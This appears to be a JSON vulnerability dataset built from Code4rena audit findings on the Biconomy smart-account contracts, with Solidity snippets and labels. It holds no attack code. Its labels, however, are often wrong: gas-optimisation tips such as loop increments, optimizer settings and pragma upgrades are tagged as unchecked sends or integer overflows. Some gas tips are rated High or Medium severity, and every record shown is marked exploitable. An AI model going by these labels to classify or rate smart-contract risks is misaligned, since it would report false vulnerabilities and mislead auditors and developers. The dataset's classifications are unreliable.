    "code": "\n[SmartAccount.sol#L83](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L83), [SmartAccount.sol#L232](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L232), [SmartAccount.sol#L495](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L495), [SmartAccount.sol#L511](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#L511)\n\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "High",
    "title": "[G-23] Sort Solidity operations using short-circuit mode",
    "description": "Short-circuiting is a solidity contract development model that uses `OR/AND` logic to sequence different cost operations. It puts low gas cost operations in the front and high gas cost operations in the back, so that if the front is low If the cost operation is feasible, you can skip (short-circuit) the subsequent high-cost Ethereum virtual machine operation. //f(x) is a low gas cost operation //g(y) is a high gas cost operation //Sort operations with different gas costs as follows f(x) || g(y)",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.604,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\n36 results - 36 files:\ncontracts/smart-contract-wallet/BaseSmartAccount.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/Proxy.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/SmartAccount.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/SmartAccountFactory.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol:\n  6: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/core/SenderCreator.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/core/StakeManager.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IAccount.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IAggregatedAccount.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IAggregator.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol:\n  6: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/IStakeManager.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/interfaces/UserOperation.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/aa-4337/utils/Exec.sol:\n  2: pragma solidity >=0.7.5 <0.9.0;\n\ncontracts/smart-contract-wallet/base/Executor.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/base/FallbackManager.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/base/ModuleManager.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/common/Enum.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/common/SecuredTokenTransfer.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/common/SignatureDecoder.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/common/Singleton.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/handler/DefaultCallbackHandler.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/ERC721TokenReceiver.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/ERC777TokensRecipient.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/ERC1155TokenReceiver.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/IERC165.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/IERC1271Wallet.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/interfaces/ISignatureValidator.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/libs/LibAddress.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/libs/Math.sol:\n  4: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/libs/MultiSend.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/libs/MultiSendCallOnly.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/paymasters/BasePaymaster.sol:\n  2: pragma solidity ^0.8.12;\n\ncontracts/smart-contract-wallet/paymasters/PaymasterHelpers.sol:\n  2: pragma solidity 0.8.12;\n\ncontracts/smart-contract-wallet/paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol:\n  2: pragma solidity 0.8.12;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-25] Use a more recent version of solidity",
    "description": "In 0.8.15 the conditions necessary for inlining are relaxed. Benchmarks show that the change significantly decreases the bytecode size (which impacts the deployment cost) while the effect on the runtime gas usage is smaller. In 0.8.17 prevent the incorrect removal of storage writes before calls to Yul functions that conditionally terminate the external EVM call; Simplify the starting offset of zero-length operations to zero. More efficient overflow checks for multiplication. 36 results - 36 files: contracts/smart-contract-wallet/BaseSmartAccount.sol: 2: pragma solidity 0.8.12;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 110,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\nSighash   |   Function Signature\n========================\naffed0e0  =>  nonce()\nce03fdab  =>  nonce(uint256)\nb0d691fe  =>  entryPoint()\n13af4035  =>  setOwner(address)\n025b22bc  =>  updateImplementation(address)\n1b71bb6e  =>  updateEntryPoint(address)\nf698da25  =>  domainSeparator()\n3408e470  =>  getChainId()\n3d46b819  =>  getNonce(uint256)\n184b9559  =>  init(address,address,address)\n6d5433e6  =>  max(uint256,uint256)\n405c3941  =>  execTransaction(Transaction,uint256,FeeRefund,bytes)\n1bb09224  =>  handlePayment(uint256,uint256,uint256,uint256,address,address)\na18f51e5  =>  handlePaymentRevert(uint256,uint256,uint256,uint256,address,address)\n934f3a11  =>  checkSignatures(bytes32,bytes,bytes)\n37cf6f29  =>  requiredTxGas(address,uint256,bytes,Enum.Operation)\nc9f909f4  =>  getTransactionHash(address,uint256,bytes,Enum.Operation,uint256,uint256,uint256,uint256,address,address,uint256)\n8d6a6751  =>  encodeTransactionData(Transaction,FeeRefund,uint256)\na9059cbb  =>  transfer(address,uint256)\nac85dca7  =>  pullTokens(address,address,uint256)\nb61d27f6  =>  execute(address,uint256,bytes)\n18dfb3c7  =>  executeBatch(address[],bytes[])\n734cd1e2  =>  _call(address,uint256,bytes)\ne8d655cf  =>  execFromEntryPoint(address,uint256,bytes,Enum.Operation,uint256)\nbe484bf7  =>  _requireFromEntryPointOrOwner()\nba74b602  =>  _validateAndUpdateNonce(UserOperation)\n0f4cd016  =>  _validateSignature(UserOperation,bytes32,address)\nc399ec88  =>  getDeposit()\n4a58db19  =>  addDeposit()\n4d44560d  =>  withdrawDepositTo(address,uint256)\n01ffc9a7  =>  supportsInterface(bytes4)\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G-26] Optimize names to save gas",
    "description": "Contracts most called functions could simply save gas by function ordering via ```Method ID```. Calling a function at runtime will be cheaper if the function is positioned earlier in the order (has a relatively lower Method ID) because ```22 gas``` are added to the cost of a function for every position that came before it. The caller can save on gas if you prioritize most called functions. **Context:** All Contracts **Recommendation:** Find a lower ```method ID``` name for the most called functions for example\u00a0Call()\u00a0vs.\u00a0Call1()\u00a0is cheaper by ```22 gas```",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 35,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "js\n  30:   solidity: {\n  31:     compilers: [\n  32:       {\n  33:         version: \"0.8.12\",\n  34:         settings: {\n  35:           optimizer: { enabled: true, runs: 200 },\n  36:         },\n  37:       },\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G-27] Upgrade Solidity's optimizer",
    "description": "Make sure Solidity\u2019s optimizer is enabled. It reduces gas costs. If you want to gas optimize for contract deployment (costs less to deploy a contract) then set the Solidity optimizer at a low number. If you want to optimize for run-time gas costs (when functions are called on a contract) then set the optimizer to a high number. Set the optimization value higher than 800 in your hardhat.config.ts file. 30:   solidity: { 31:     compilers: [ 32:       {",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 11,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.209,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "require(msg.value!=0,\"Invalid Deposit Value\");",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Low",
    "title": "LOW - [L48] depositTo function:",
    "description": "- No validation that msg.value should be != 0. Users depositing with msg.value = 0 will only make them lose on gas. add: `require(msg.value!=0,\"Invalid Deposit Value\");`",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.046,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol\n\n61: require(_unstakeDelaySec > 0, \"must specify unstake delay\")\n64: require(stake > 0, \"no stake specified\")\n99: require(stake > 0, \"No stake to withdraw\")\n100: require(info.withdrawTime > 0, \"must call unlockStake() first\")\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G-01] Using `> 0` costs more gas than using `!= 0`",
    "description": "*There are 12 instances of this issue.* File: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 174: if (callData.length > 0) 178: if (result.length > 0) 212: if (paymasterAndData.length > 0)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.303,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol\n\n74: for (uint256 i = 0; i < opslen; i++)\n80: for (uint256 i = 0; i < opslen; i++)\n100: for (uint256 i = 0; i < opasLen; i++)\n107: for (uint256 a = 0; a < opasLen; a++)\n112: for (uint256 i = 0; i < opslen; i++)\n114: opIndex++;\n128: for (uint256 a = 0; a < opasLen; a++)\n134: for (uint256 i = 0; i < opslen; i++)\n136: opIndex++;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Gas",
    "title": "[G-02] Using `i++` costs more gas than using `++i`. Also can add `unchecked { ++i; }` in for loops where overflow is not possible",
    "description": "*There are 17 instances of this issue.* File: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 74: for (uint256 i = 0; i < opslen; i++) 80: for (uint256 i = 0; i < opslen; i++) 100: for (uint256 i = 0; i < opasLen; i++)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 13,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.403,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: contracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol\n\n67: balances[token][account] += amount;\n103: balances[token][msg.sender] -= amount;\n160: balances[token][account] -= actualTokenCost;\n162: balances[token][owner()] += actualTokenCost;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Gas",
    "title": "[G-03] Using x += y costs more gas than using x = x + y",
    "description": "*There are 9 instances of this issue.* File: contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol 81: collected += _executeUserOp(i, ops[i], opInfos[i]); 101: totalOps += opsPerAggregator[i].userOps.length; 468: actualGas += preGas - gasleft();",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.269,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": " \ncontract Test { \n\tfunction loopTest() external { \n\t\tfor (uint256 i; i < 1; ++i) { \n\t\t\tDeployment Cost: 125,637, Cost on function call: 24,601 \n\t\t\n\t\tvs \n\t\t\n\t\tfor (uint256 i; i < 1; ) { \n\t\t\t// for loop body \n\t\t\tunchecked { ++i } \n\t\t\tDeployment Cost: 93,984, Cost on function call: 24,460 \n\t\t} \n\t} \n} \n",
    "vulnerability_label": 1,
    "vulnerability_type": "integer_overflow",
    "severity": "Low",
    "title": "#### [G01] Unchecked increments in for loops",
    "description": "**Description:** When incrementing i in for loops there is no chance of overflow so unchecked can be used to save gas. I ran a simple test in remix and found deployment savings of ~31,653 gas and on each function call saved ~141 gas per iteration. **LOC:** [EntryPoint.sol#L100](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L100) [EntryPoint.sol#L107](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol#L107)",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 16,
    "has_external_calls": true,
    "has_state_changes": false,
    "complexity_score": 0.301,
    "vulnerability_types": [
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\ncontract Test {\n\tuint256 testVariable = 4;\n\n\tfunction testFunction() public {\n\t\trequire(testVariable < 10);\n\t\trequire(testVariable > 1);\n\t\t(Deployment cost: 120,933, Execution cost: 26,947)\n\n\t\tvs\n\n\t\tuint256 testCache = testVariable;\n\t\trequire(testCache < 10);\n\t\trequire(testCache > 1);\n\t\t(Deployment cost: 121,692, Execution cost: 26,847) \n\t}\n}\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "High",
    "title": "[G05] Referencing State variables more than once.",
    "description": "**Description:** Whenever referencing a state variable more than once in a function without modifying it, you can save ~100 gas per use by caching the value and referencing that instead. (Note: Based on a test in remix deployment costs will be slightly higher (~759 gas). **LOC:** [StakeManager.sol#L82-L84](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L82-L84) - can cache info.unstakeDelaySec. [StakeManager.sol#L100-L101](https://github.com/code-423n4/2023-01-biconomy/blob/53c8c3823175aeb26dee5529eeefa81240a406ba/scw-contracts/contracts/smart-contract-wallet/aa-4337/core/StakeManager.sol#L100-L101) - can cache info.withdrawTime.",
    "confidence": 0.9,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 18,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 0.346,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": true,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "solidity\nFile: base/Executor.sol\n\n23:        success := delegatecall(txGas, to, add(data, 0x20), mload(data), 0, 0)\n\n28:        success := call(txGas, to, value, add(data, 0x20), mload(data), 0, 0)\n\n",
    "vulnerability_label": 1,
    "vulnerability_type": "unchecked_send",
    "severity": "Low",
    "title": "[L-2] MISSING CONTRACT-EXISTENCE CHECKS BEFORE LOW-LEVEL CALLS",
    "description": "*Instances (6)*: File: Proxy.sol 28:        let result := delegatecall(gas(), target, 0, calldatasize(), 0, 0) [Link to Code](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/Proxy.sol#L28) File: aa-4337/utils/Exec.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 8,
    "has_external_calls": true,
    "has_state_changes": true,
    "complexity_score": 0.199,
    "vulnerability_types": [
      0,
      0,
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "solidity\nFile: paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol\n\n65:      function setSigner( address _newVerifyingSigner) external onlyOwner{\n",
    "vulnerability_label": 1,
    "vulnerability_type": "access_control",
    "severity": "Low",
    "title": "[L-3] CONSIDER USING A TWO-STEP-TRANSFER OF OWNERSHIP",
    "description": "*Instances (2)*: File: SmartAccount.sol 109:      function setOwner(address _newOwner) external mixedAuth { [Link of Code](https://github.com/code-423n4/2023-01-biconomy/blob/main/scw-contracts/contracts/smart-contract-wallet/SmartAccount.sol#109) File: paymasters/verifying/singleton/VerifyingSingletonPaymaster.sol",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 5,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.157,
    "vulnerability_types": [
      0,
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "deployCounterFactualWallet",
    "vulnerability_label": 1,
    "vulnerability_type": "reentrancy",
    "severity": "Low",
    "title": "[L-4] POSSIBLE REENTRANCY ATTACK",
    "description": "In `deployCounterFactualWallet` and `deployWallet` method of `SmartAccountFactory.sol`, the State variable `isAccountExist` is changed after making all the External Calls. But It is recommended finishing all internal work (ie. state changes) first, and only then calling the external function.",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 1,
    "has_external_calls": false,
    "has_state_changes": false,
    "complexity_score": 0.026,
    "vulnerability_types": [
      1,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": true
  },
  {
    "code": "\ncontracts/smart-contract-wallet/SmartAccount.sol::234 => uint256 payment = 0;\ncontracts/smart-contract-wallet/SmartAccount.sol::310 => uint256 i = 0;\ncontracts/smart-contract-wallet/SmartAccount.sol::468 => for (uint i = 0; i < dest.length;) {\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::234 => uint256 payment = 0;\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::305 => uint256 i = 0;\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::458 => for (uint i = 0; i < dest.length;) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::74 => for (uint256 i = 0; i < opslen; i++) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::78 => uint256 collected = 0;\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::80 => for (uint256 i = 0; i < opslen; i++) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::99 => uint256 totalOps = 0;\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::100 => for (uint256 i = 0; i < opasLen; i++) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::106 => uint256 opIndex = 0;\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::107 => for (uint256 a = 0; a < opasLen; a++) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::112 => for (uint256 i = 0; i < opslen; i++) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::126 => uint256 collected = 0;\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::128 => for (uint256 a = 0; a < opasLen; a++) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::134 => for (uint256 i = 0; i < opslen; i++) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::313 => uint256 missingAccountFunds = 0;\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccount.sol::71 => for (uint256 i = 0; i < dest.length; i++) {\ncontracts/smart-contract-wallet/aa-4337/samples/TestSignatureAggregator.sol::18 => uint sum = 0;\ncontracts/smart-contract-wallet/aa-4337/samples/TestSignatureAggregator.sol::19 => for (uint i = 0; i < userOps.length; i++) {\ncontracts/smart-contract-wallet/aa-4337/samples/TestSignatureAggregator.sol::38 => uint sum = 0;\ncontracts/smart-contract-wallet/aa-4337/samples/TestSignatureAggregator.sol::39 => for (uint i = 0; i < userOps.length; i++) {\ncontracts/smart-contract-wallet/base/ModuleManager.sol::119 => uint256 moduleCount = 0;\ncontracts/smart-contract-wallet/libs/Math.sol::206 => uint256 result = 0;\ncontracts/smart-contract-wallet/libs/Math.sol::259 => uint256 result = 0;\ncontracts/smart-contract-wallet/libs/Math.sol::310 => uint256 result = 0;\n",
    "vulnerability_label": 1,
    "vulnerability_type": "other",
    "severity": "Medium",
    "title": "Findings:",
    "description": "contracts/smart-contract-wallet/SmartAccount.sol::234 => uint256 payment = 0; contracts/smart-contract-wallet/SmartAccount.sol::310 => uint256 i = 0; contracts/smart-contract-wallet/SmartAccount.sol::468 => for (uint i = 0; i < dest.length;) { contracts/smart-contract-wallet/SmartAccountNoAuth.sol::234 => uint256 payment = 0; contracts/smart-contract-wallet/SmartAccountNoAuth.sol::305 => uint256 i = 0;",
    "confidence": 0.7,
    "source": "code4rena",
    "repository": "2023-01-biconomy-findings",
    "audit_source": "code4rena",
    "lines_of_code": 29,
    "has_external_calls": false,
    "has_state_changes": true,
    "complexity_score": 1.0,
    "vulnerability_types": [
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    ],
    "proof_required": false,
    "exploit_possible": true,
    "formal_verification_target": false
  },
  {
    "code": "contracts/smart-contract-wallet/BaseSmartAccount.sol::64 => if (userOp.initCode.length == 0) {\ncontracts/smart-contract-wallet/SmartAccount.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\ncontracts/smart-contract-wallet/SmartAccount.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\ncontracts/smart-contract-wallet/SmartAccount.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8);\ncontracts/smart-contract-wallet/SmartAccount.sol::324 => // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)\ncontracts/smart-contract-wallet/SmartAccount.sol::325 => require(uint256(s) + 32 <= signatures.length, \"BSA022\");\ncontracts/smart-contract-wallet/SmartAccount.sol::327 => // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length\ncontracts/smart-contract-wallet/SmartAccount.sol::333 => require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\ncontracts/smart-contract-wallet/SmartAccount.sol::467 => require(dest.length == func.length, \"wrong array lengths\");\ncontracts/smart-contract-wallet/SmartAccount.sol::468 => for (uint i = 0; i < dest.length;) {\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::199 => //            ~= 21k + calldata.length * [1/3 * 16 + 2/3 * 4]\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::200 => uint256 startGas = gasleft() + 21000 + msg.data.length * 8;\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::201 => //console.log(\"init %s\", 21000 + msg.data.length * 8);\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::319 => // Check that signature data pointer (s) is in bounds (points to the length of data -> 32 bytes)\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::320 => require(uint256(s) + 32 <= signatures.length, \"BSA022\");\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::322 => // Check if the contract signature is in bounds: start of data is s + 32 and end is start + signature length\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::328 => require(uint256(s) + 32 + contractSignatureLen <= signatures.length, \"BSA023\");\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::457 => require(dest.length == func.length, \"wrong array lengths\");\ncontracts/smart-contract-wallet/SmartAccountNoAuth.sol::458 => for (uint i = 0; i < dest.length;) {\ncontracts/smart-contract-wallet/aa-4337/core/BaseAccount.sol::39 => if (userOp.initCode.length == 0) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::70 => uint256 opslen = ops.length;\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::98 => uint256 opasLen = opsPerAggregator.length;\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::101 => totalOps += opsPerAggregator[i].userOps.length;\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::111 => uint256 opslen = ops.length;\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::132 => uint256 opslen = ops.length;\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::174 => if (callData.length > 0) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::178 => if (result.length > 0) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::212 => if (paymasterAndData.length > 0) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::213 => require(paymasterAndData.length >= 20, \"AA93 invalid paymasterAndData\");\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::237 => address factory = initCode.length >= 20 ? address(bytes20(initCode[0 : 20])) : address(0);\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::262 => if (initCode.length != 0) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::264 => if (sender.code.length != 0) revert FailedOp(opIndex, address(0), \"AA10 sender already constructed\");\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::268 => if (sender1.code.length == 0) revert FailedOp(opIndex, address(0), \"AA15 initCode must create sender\");\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::299 => if (sender.code.length == 0) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::303 => if (mUserOp.paymaster != address(0) && mUserOp.paymaster.code.length == 0) {\ncontracts/smart-contract-wallet/aa-4337/core/EntryPoint.sol::452 => if (context.length > 0) {\ncontracts/smart-contract-wallet/aa-4337/interfaces/IEntryPoint.sol::40 => * An event emitted if the UserOperation \"callData\" reverted with non-zero length\ncontracts/smart-contract-wallet/aa-4337/interfaces/IPaymaster.sol::22 => *  zero length to signify postOp is not required.\ncontracts/smart-contract-wallet/aa-4337/samples/DepositPaymaster.sol::133 => require(paymasterAndData.length == 20+20, \"DepositPaymaster: paymasterAndData must specify token\");\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccount.sol::70 => require(dest.length == func.length, \"wrong array lengths\");\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccount.sol::71 => for (uint256 i = 0; i < dest.length; i++) {\ncontracts/smart-contract-wallet/aa-4337/samples/SimpleAccountFactory.sol::30 => uint codeSize = addr.code.length;\ncontracts/smart-contract-wallet/aa-4337/samples/TestAggregatedAccountFactory.sol::29 => uint codeSize = addr.code.length;\ncontracts/smart-contract-wallet/aa-4337/samples/TestSignatureAggregator.sol::19 => for (uint i = 0; i < userOps.length; i++) {\ncontracts/smart-contract-wallet/aa-4337/samples/TestSignatureAggregator.sol::24 => require(signature.length == 32, \"TestSignatureValidator: sig must be uint\");\ncontracts/smart-contract-wallet/aa-4337/samples/TestSignatureAggregator.sol::39 => for (uint i = 0; i < userOps.length; i++) {\ncontracts/smart-contract-wallet/aa-4337/samples/TokenPaymaster.sol::78 => if (userOp.initCode.length != 0) 